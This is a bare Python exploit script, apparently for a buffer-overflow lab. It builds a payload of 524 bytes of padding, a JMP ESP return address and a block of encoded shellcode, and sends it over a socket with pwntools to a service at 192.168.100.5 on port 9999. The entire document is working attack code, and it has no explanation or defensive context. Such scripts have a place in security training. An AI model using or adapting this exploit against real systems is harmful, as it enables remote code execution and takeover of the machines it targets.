#!/usr/bin/python3
from pwn import remote, p32

offset = 524
junk = b"A" * offset

jmpesp = p32(0x311712f3)

shellcode =  b""
shellcode += b"\xfc\xbb\x46\xbc\x5d\x42\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\xba\x54\xdf\x42\x42\xa5\x80\xcb"
shellcode += b"\xa7\x94\x80\xa8\xac\x87\x30\xba\xe0\x2b\xba"
shellcode += b"\xee\x10\xbf\xce\x26\x17\x08\x64\x11\x16\x89"
shellcode += b"\xd5\x61\x39\x09\x24\xb6\x99\x30\xe7\xcb\xd8"
shellcode += b"\x75\x1a\x21\x88\x2e\x50\x94\x3c\x5a\x2c\x25"
shellcode += b"\xb7\x10\xa0\x2d\x24\xe0\xc3\x1c\xfb\x7a\x9a"
shellcode += b"\xbe\xfa\xaf\x96\xf6\xe4\xac\x93\x41\x9f\x07"
shellcode += b"\x6f\x50\x49\x56\x90\xff\xb4\x56\x63\x01\xf1"
shellcode += b"\x51\x9c\x74\x0b\xa2\x21\x8f\xc8\xd8\xfd\x1a"
shellcode += b"\xca\x7b\x75\xbc\x36\x7d\x5a\x5b\xbd\x71\x17"
shellcode += b"\x2f\x99\x95\xa6\xfc\x92\xa2\x23\x03\x74\x23"
shellcode += b"\x77\x20\x50\x6f\x23\x49\xc1\xd5\x82\x76\x11"
shellcode += b"\xb6\x7b\xd3\x5a\x5b\x6f\x6e\x01\x34\x5c\x43"
shellcode += b"\xb9\xc4\xca\xd4\xca\xf6\x55\x4f\x44\xbb\x1e"
shellcode += b"\x49\x93\xbc\x34\x2d\x0b\x43\xb7\x4e\x02\x80"
shellcode += b"\xe3\x1e\x3c\x21\x8c\xf4\xbc\xce\x59\x5a\xec"
shellcode += b"\x60\x32\x1b\x5c\xc1\xe2\xf3\xb6\xce\xdd\xe4"
shellcode += b"\xb9\x04\x76\x8e\x40\xcf\xb9\xe7\x2e\x5a\x52"
shellcode += b"\xfa\xae\x65\x19\x73\x48\x0f\x4d\xd2\xc3\xb8"
shellcode += b"\xf4\x7f\x9f\x59\xf8\x55\xda\x5a\x72\x5a\x1b"
shellcode += b"\x14\x73\x17\x0f\xc1\x73\x62\x6d\x44\x8b\x58"
shellcode += b"\x19\x0a\x1e\x07\xd9\x45\x03\x90\x8e\x02\xf5"
shellcode += b"\xe9\x5a\xbf\xac\x43\x78\x42\x28\xab\x38\x99"
shellcode += b"\x89\x32\xc1\x6c\xb5\x10\xd1\xa8\x36\x1d\x85"
shellcode += b"\x64\x61\xcb\x73\xc3\xdb\xbd\x2d\x9d\xb0\x17"
shellcode += b"\xb9\x58\xfb\xa7\xbf\x64\xd6\x51\x5f\xd4\x8f"
shellcode += b"\x27\x60\xd9\x47\xa0\x19\x07\xf8\x4f\xf0\x83"
shellcode += b"\x18\xb2\xd0\xf9\xb0\x6b\xb1\x43\xdd\x8b\x6c"
shellcode += b"\x87\xd8\x0f\x84\x78\x1f\x0f\xed\x7d\x5b\x97"
shellcode += b"\x1e\x0c\xf4\x72\x20\xa3\xf5\x56\x20\x43\x0a"
shellcode += b"\x59"

shell = remote("192.168.100.5", 9999)

payload = junk + jmpesp + shellcode

shell.sendline(payload)
shell.close()
